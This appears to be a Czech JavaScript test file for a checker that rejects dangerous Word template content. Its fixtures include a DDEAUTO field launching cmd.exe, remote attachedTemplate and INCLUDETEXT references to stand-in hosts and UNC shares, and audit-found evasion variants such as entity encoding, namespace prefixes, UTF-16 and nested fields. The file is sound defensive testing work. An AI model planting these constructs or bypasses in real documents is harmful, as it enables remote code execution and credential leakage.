/* B99 (29. 9. 2026) — KONTROLA OBSAHU ŠABLONY WORDU.
 *
 * Syntetické .docx (žádné firemní podklady): čistá šablona, šablona
 * s hypertextovým odkazem https / mailto a šablony s každým zakázaným
 * prvkem — vnější attachedTemplate v settings.xml.rels, oleObject, package,
 * altChunk, vbaProject, vložený objekt, ActiveX, typ obsahu macroEnabled,
 * pole INCLUDETEXT (i rozdělené do běhů), INCLUDEPICTURE, DDE, DDEAUTO,
 * vnější frame. Pravidlo 0 (před opravou): kontroly průvodce (docxXmlVady,
 * docxTextSablony) šablonu s attachedTemplate přijaly a docxVyplnSablonu
 * i docxPrelozSablonu ji přenesly do výsledku beze změny. Před opravou
 * modul src/sablona_obsah.js neexistoval — sada selže na první kontrole.
 *
 * Spuštění: cd src && node test_sablona_obsah.js */
const DG = require('./docxgen.js');
let SO = null;
try { SO = require('./sablona_obsah.js'); } catch (e) { SO = null; }

let ok = 0, fail = 0;
const test = (n, cond, info) => { if (cond) { ok++; console.log('OK   ' + n); } else { fail++; console.log('FAIL ' + n, info === undefined ? '' : JSON.stringify(info)); } };
const enc = new TextEncoder(), dec = new TextDecoder();

(async () => {
  /* Základ: minimální platný .docx ze zdejšího generátoru + symbol {{X}}. */
  const zaklad = await DG.zipPrecti(new Uint8Array(await DG.docxDokumentBlob('Zkušební šablona {{X}}', []).arrayBuffer()));
  const sestav = async (uprav) => {
    const p = zaklad.map(x => ({ nazev: x.nazev, data: new Uint8Array(x.data) }));
    uprav(p);
    return new Uint8Array(await DG.zipZapis(p).arrayBuffer());
  };
  const pridej = (p, nazev, text) => { const i = p.findIndex(x => x.nazev === nazev); const d = enc.encode(text); if (i >= 0) p[i].data = d; else p.push({ nazev, data: d }); };
  const docText = (p) => dec.decode(p.find(x => x.nazev === 'word/document.xml').data);
  const doDoc = (p, xml) => pridej(p, 'word/document.xml', docText(p).replace('</w:body>', xml + '</w:body>'));
  const RELS = (radky) => '<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">' + radky + '</Relationships>';
  const R = 'http://schemas.openxmlformats.org/officeDocument/2006/relationships/';
  const rel = (id, typ, cil, ext) => '<Relationship Id="' + id + '" Type="' + R + typ + '" Target="' + cil + '"' + (ext ? ' TargetMode="External"' : '') + '/>';
  const docRels = (p, radek) => {
    const n = 'word/_rels/document.xml.rels';
    const puvodni = p.find(x => x.nazev === n);
    const text = puvodni ? dec.decode(puvodni.data).replace('</Relationships>', radek + '</Relationships>') : RELS(radek);
    pridej(p, n, text);
  };
  const s = {
    cista: await sestav(() => {}),
    https: await sestav(p => docRels(p, rel('rIdH', 'hyperlink', 'https://www.example.cz/', true))),
    mailto: await sestav(p => docRels(p, rel('rIdM', 'hyperlink', 'mailto:nabidky@example.cz', true))),
    attachedTemplate: await sestav(p => pridej(p, 'word/_rels/settings.xml.rels', RELS(rel('rId1', 'attachedTemplate', 'https://example.invalid/x.dotm', true)))),
    attachedUnc: await sestav(p => pridej(p, 'word/_rels/settings.xml.rels', RELS(rel('rId1', 'attachedTemplate', 'file://server/share/x.dotm', true)))),
    hyperlinkFile: await sestav(p => docRels(p, rel('rIdF', 'hyperlink', 'file:///C:/tajne.docx', true))),
    oleObject: await sestav(p => docRels(p, rel('rIdO', 'oleObject', 'embeddings/oleObject1.bin'))),
    package: await sestav(p => docRels(p, rel('rIdP', 'package', 'embeddings/Microsoft_Excel.xlsx'))),
    altChunk: await sestav(p => docRels(p, rel('rIdA', 'aFChunk', 'https://example.invalid/chunk.html', true))),
    vbaVztah: await sestav(p => docRels(p, rel('rIdV', 'vbaProject', 'vbaProject.bin'))),
    vbaCast: await sestav(p => pridej(p, 'word/vbaProject.bin', 'x')),
    embeddings: await sestav(p => pridej(p, 'word/embeddings/oleObject1.bin', 'x')),
    activeX: await sestav(p => pridej(p, 'word/activeX/activeX1.xml', '<ax/>')),
    macro: await sestav(p => { const i = p.findIndex(x => x.nazev === '[Content_Types].xml');
      pridej(p, '[Content_Types].xml', dec.decode(p[i].data).replace('</Types>', '<Override PartName="/word/document.xml" ContentType="application/vnd.ms-word.document.macroEnabled.main+xml"/></Types>')); }),
    includeText: await sestav(p => doDoc(p, '<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText xml:space="preserve"> INCLUDETEXT "https://example.invalid/a.docx" </w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>')),
    includeRozdelene: await sestav(p => doDoc(p, '<w:p><w:r><w:instrText> INCLU</w:instrText></w:r><w:r><w:instrText>DEPICTURE "\\\\\\\\server\\\\share\\\\a.png" </w:instrText></w:r></w:p>')),
    dde: await sestav(p => doDoc(p, '<w:p><w:fldSimple w:instr=" DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe &quot;/k calc&quot; "><w:r><w:t>x</w:t></w:r></w:fldSimple></w:p>')),
    ddeMale: await sestav(p => doDoc(p, '<w:p><w:r><w:instrText> dde excel "list" </w:instrText></w:r></w:p>')),
    frame: await sestav(p => docRels(p, rel('rIdR', 'frame', 'https://example.invalid/frame.html', true))),
  };

  /* Pravidlo 0 — co dnešní kontroly průvodce a generátor s vadnou šablonou dělají. */
  const vadyXml = await DG.docxXmlVady(s.attachedTemplate.buffer);
  test('Pravidlo 0: kontrola struktury XML (průvodce) šablonu s attachedTemplate nepozná', vadyXml.length === 0, vadyXml);

  test('B99: modul src/sablona_obsah.js existuje', !!SO);
  if (!SO) { console.log(`\n${ok} prošlo, ${fail} selhalo`); process.exit(1); }

  test('B99: čistá šablona projde', (await SO.sablonaObsahVady(s.cista)).length === 0, await SO.sablonaObsahVady(s.cista));
  test('B99: hypertextový odkaz https projde', (await SO.sablonaObsahVady(s.https)).length === 0, await SO.sablonaObsahVady(s.https));
  test('B99: hypertextový odkaz mailto projde (nesou ho firemní šablony PROJ)', (await SO.sablonaObsahVady(s.mailto)).length === 0, await SO.sablonaObsahVady(s.mailto));
  for (const [k, ocek] of [['attachedTemplate', /attachedTemplate/], ['attachedUnc', /attachedTemplate/], ['hyperlinkFile', /nepovolenou adresou/],
    ['oleObject', /oleObject/], ['package', /package/], ['altChunk', /aFChunk/], ['vbaVztah', /vbaProject/], ['vbaCast', /makra VBA/],
    ['embeddings', /vložený objekt/], ['activeX', /ActiveX/], ['macro', /macroEnabled/], ['includeText', /INCLUDETEXT/],
    ['includeRozdelene', /INCLUDEPICTURE/], ['dde', /DDEAUTO/], ['ddeMale', /pole DDE/], ['frame', /frame/]]) {
    const v = await SO.sablonaObsahVady(s[k]);
    test('B99: ' + k + ' → odmítnuto s popisem', v.length > 0 && v.some(x => ocek.test(x)), v);
  }
  const b64 = Buffer.from(s.attachedTemplate).toString('base64');
  test('B99: kontrola umí i base64 (tvar, ve kterém šablona chodí na server)', (await SO.sablonaObsahVady(b64)).length === 1);
  test('B99: nečitelný soubor je vada', (await SO.sablonaObsahVady('UEsDBnesmysl')).length === 1);
  test('B99: text odmítnutí je česky a řekne, co vadí', /attachedTemplate/.test(SO.sablonaObsahVadyText(await SO.sablonaObsahVady(s.attachedTemplate))));

  /* Obrana do hloubky: generátor i překlad šablonu odmítnou (ne tiše vyhodí). */
  global.sablonaObsahVady = SO.sablonaObsahVady; global.sablonaObsahVadyText = SO.sablonaObsahVadyText;
  let chyba = '';
  try { await DG.docxVyplnSablonu(s.attachedTemplate.buffer, { X: 'hodnota' }, [], {}); } catch (e) { chyba = e.message; }
  test('B99: generátor (docxVyplnSablonu) šablonu s attachedTemplate odmítne', /attachedTemplate/.test(chyba), chyba);
  chyba = '';
  try { await DG.docxPrelozSablonu(s.attachedTemplate.buffer, 'en', {}); } catch (e) { chyba = e.message; }
  test('B99: překlad šablony (docxPrelozSablonu) ji odmítne také', /attachedTemplate/.test(chyba), chyba);
  let vysledek = null;
  try { vysledek = await DG.docxVyplnSablonu(s.https.buffer, { X: 'hodnota' }, [], {}); } catch (e) { vysledek = e.message; }
  test('B99: z čisté šablony s odkazem https generátor vyrobí dokument', vysledek && typeof vysledek === 'object', vysledek);

  /* B115 (audit 30. 9. 2026) — pět obchvatů kontroly B99, každý doložený
   * pokusem auditu (kontrola vrátila prázdný seznam), a další tvary téže
   * třídy. Před opravou: obchvaty prošly (0 vad), po opravě odmítnuty. */
  const W = 'xmlns:x="http://schemas.openxmlformats.org/wordprocessingml/2006/main"';
  const pole = (kod) => '<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText xml:space="preserve">' + kod
    + '</w:instrText></w:r><w:r><w:fldChar w:fldCharType="separate"/></w:r><w:r><w:t>x</w:t></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>';
  const dokument = (telo) => '<?xml version="1.0" encoding="UTF-8" standalone="yes"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body>'
    + telo + '</w:body></w:document>';
  const o = {
    /* (1) číselné entity v Type i TargetMode */
    entity: await sestav(p => pridej(p, 'word/_rels/settings.xml.rels', RELS('<Relationship Id="rId1" Type="' + R + 'attachedTempl&#97;te" Target="https://example.invalid/x.dotm" TargetMode="Ex&#116;ernal"/>'))),
    entityHex: await sestav(p => pridej(p, 'word/_rels/settings.xml.rels', RELS('<Relationship Id="rId1" Type="' + R + '&#x61;ttachedTemplate" Target="\\\\server\\share\\x.dotm" TargetMode="&#x45;xternal"/>'))),
    /* (2) pole přes jiný prefix jmenného prostoru */
    prefix: await sestav(p => doDoc(p, '<x:p ' + W + '><x:r><x:fldChar x:fldCharType="begin"/></x:r><x:r><x:instrText> INCLUDETEXT "https://example.invalid/a.docx" </x:instrText></x:r><x:r><x:fldChar x:fldCharType="end"/></x:r></x:p>')),
    prefixSimple: await sestav(p => doDoc(p, '<x:fldSimple ' + W + ' x:instr=" INCLUDEPICTURE &quot;\\\\server\\share\\a.png&quot; "><x:r><x:t>x</x:t></x:r></x:fldSimple>')),
    /* (3) dokument mimo word/<jeden segment>.xml */
    word2: await sestav(p => { pridej(p, 'word2/document.xml', dokument(pole(' INCLUDETEXT "https://example.invalid/a.docx" '))); }),
    glosar: await sestav(p => pridej(p, 'word/glossary/document.xml', dokument(pole(' INCLUDEPICTURE "https://example.invalid/a.png" \\d ')))),
    embeddings2: await sestav(p => pridej(p, 'word2/embeddings/objekt1.dat', 'x')),
    oleNazev: await sestav(p => pridej(p, 'word/media/oleObject1.bin', 'x')),
    /* (4) interní oleObject / package se zamlženým Type mimo embeddings/ */
    oleZamlzeny: await sestav(p => docRels(p, '<Relationship Id="rIdO" Type="' + R + 'ole&#79;bject" Target="media/obr9.bin"/>')),
    packageZamlzeny: await sestav(p => docRels(p, '<Relationship Id="rIdP" Type="' + R + 'p&#x61;ckage" Target="media/tabulka.xlsx"/>')),
    /* (5) pole LINK */
    link: await sestav(p => doDoc(p, pole(' LINK Excel.Sheet.12 "\\\\\\\\server\\\\share\\\\a.xlsx" "List1!R1C1" \\a \\f 4 '))),
    /* další tvary téže třídy */
    gtVAtributu: await sestav(p => pridej(p, 'word/_rels/settings.xml.rels', RELS('<Relationship Id="rId1" Target="https://example.invalid/a>b.dotm" Type="' + R + 'attachedTemplate" TargetMode="External"/>'))),
    staryInclude: await sestav(p => doDoc(p, pole(' INCLUDE "https://example.invalid/a.docx" '))),
    importPole: await sestav(p => doDoc(p, pole(' IMPORT "https://example.invalid/a.png" '))),
    entitaVPoli: await sestav(p => doDoc(p, pole(' &#73;NCLUDETEXT "https://example.invalid/a.docx" '))),
    utf16: await sestav(p => { const t = dokument(pole(' INCLUDETEXT "https://example.invalid/a.docx" ')).replace('encoding="UTF-8"', 'encoding="UTF-16"');
      const u = new Uint8Array(2 + t.length * 2); u[0] = 0xFF; u[1] = 0xFE; for (let i = 0; i < t.length; i++) { u[2 + i * 2] = t.charCodeAt(i) & 255; u[3 + i * 2] = t.charCodeAt(i) >> 8; }
      p.push({ nazev: 'word/footer9.xml', data: u }); }),
    jinyNazev: await sestav(p => pridej(p, 'word/obsah.dat', dokument(pole(' INCLUDETEXT "https://example.invalid/a.docx" ')))),
    doctype: await sestav(p => pridej(p, 'word/_rels/settings.xml.rels', '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY t "attachedTemplate">]>' + RELS(rel('rId1', '&t;', 'https://example.invalid/x.dotm', true)).replace(/^<\?xml[^>]*>/, ''))),
    obrazekVnejsi: await sestav(p => docRels(p, rel('rIdI', 'image', 'file://server/share/a.png', true))),
    vnejsiBezModu: await sestav(p => docRels(p, rel('rIdI', 'image', '\\\\server\\share\\a.png', false))),
  };
  for (const [k, ocek] of [['entity', /attachedTemplate/], ['entityHex', /attachedTemplate/], ['prefix', /INCLUDETEXT/], ['prefixSimple', /INCLUDEPICTURE/],
    ['word2', /INCLUDETEXT/], ['glosar', /INCLUDEPICTURE/], ['embeddings2', /vložený objekt/], ['oleNazev', /vložený objekt/], ['oleZamlzeny', /oleObject/], ['packageZamlzeny', /package/],
    ['link', /pole LINK/], ['gtVAtributu', /attachedTemplate/], ['staryInclude', /pole INCLUDE\b/], ['importPole', /pole IMPORT/], ['entitaVPoli', /INCLUDETEXT/],
    ['utf16', /INCLUDETEXT/], ['jinyNazev', /INCLUDETEXT/], ['doctype', /DOCTYPE/], ['obrazekVnejsi', /vnější vztah image/], ['vnejsiBezModu', /vnější vztah image/]]) {
    const v = await SO.sablonaObsahVady(o[k]);
    test('B115: obchvat ' + k + ' → odmítnut s popisem', v.length > 0 && v.some(x => ocek.test(x)), v);
  }
  /* Co projít musí: odkazy a běžná pole, i když slovo „link" nesou jinde. */
  const cisteDalsi = {
    hyperlinkPole: await sestav(p => doDoc(p, pole(' HYPERLINK "https://www.example.cz/link/include" ') + pole(' HYPERLINK \\l "_Toc1" '))),
    bezneSimple: await sestav(p => doDoc(p, '<w:fldSimple w:instr=" PAGE \\* MERGEFORMAT "><w:r><w:t>1</w:t></w:r></w:fldSimple>' + pole(' DATE \\@ "d. M. yyyy" ') + pole(' REF _Ref123 \\h '))),
    odkazEntita: await sestav(p => docRels(p, '<Relationship Id="rIdH" Type="' + R + 'hyperlink" Target="https://www.example.cz/?a=1&amp;b=&#50;" TargetMode="External"/>')),
    vnorenePole: await sestav(p => doDoc(p, '<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText> IF </w:instrText></w:r><w:r><w:fldChar w:fldCharType="begin"/></w:r>'
      + '<w:r><w:instrText> PAGE </w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r><w:r><w:instrText> = 1 "link" "jinak" </w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>')),
  };
  for (const k of Object.keys(cisteDalsi)) {
    const v = await SO.sablonaObsahVady(cisteDalsi[k]);
    test('B115: legitimní ' + k + ' projde', v.length === 0, v);
  }
  {
    /* Typ pole z vnořeného pole (Word výsledek vnořeného pole do kódu dosadí). */
    const v = await SO.sablonaObsahVady(await sestav(p => doDoc(p, '<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:fldChar w:fldCharType="begin"/></w:r>'
      + '<w:r><w:instrText> QUOTE "INCLUDETEXT" </w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r><w:r><w:instrText> "https://example.invalid/a.docx" </w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>')));
    test('B115: pole, jehož typ dodá vnořené pole → odmítnuto', v.length > 0, v);
  }

  /* Firemní šablony (jen s KNG_PODKLADY, mimo repozitář) — kontrola je nesmí
   * odmítnout: CN v14 + EN/DE/FR, CN v11, PROJ v3, PROJ v4 + EN/DE/FR, SoD
   * realizace a projekce, plná moc. */
  {
    const fs = require('fs'), path = require('path');
    const slozka = String(process.env.KNG_PODKLADY || '').trim();
    const sablony = slozka && fs.existsSync(slozka) ? fs.readdirSync(slozka).filter(f => /^Sablona_.*\.docx$/i.test(f)).sort() : [];
    if (!sablony.length) console.log('–    firemní šablony (KNG_PODKLADY) nejsou po ruce — přeskočeno');
    else {
      const pozadovane = [/CN_v14\.docx$/i, /CN_v14.*_EN/i, /CN_v14.*_DE/i, /CN_v14.*_FR/i, /CN_v11\.docx$/i, /^Sablona_NABIDKA_PROJ\.docx$/i,
        /PROJ_v4\.docx$/i, /PROJ_v4.*_EN/i, /PROJ_v4.*_DE/i, /PROJ_v4.*_FR/i, /SOD_REALIZACE/i, /SOD_PROJEKCE/i, /PLNA_MOC/i];
      for (const vz of pozadovane) {
        const f = sablony.find(x => vz.test(x));
        if (!f) { console.log('–    firemní šablona ' + vz + ' v KNG_PODKLADY chybí'); continue; }
        const v = await SO.sablonaObsahVady(new Uint8Array(fs.readFileSync(path.join(slozka, f))));
        test('B115: firemní šablona ' + f + ' projde', v.length === 0, v);
      }
    }
  }

  console.log(`\n${ok} prošlo, ${fail} selhalo`);
  process.exit(fail ? 1 : 0);
})();
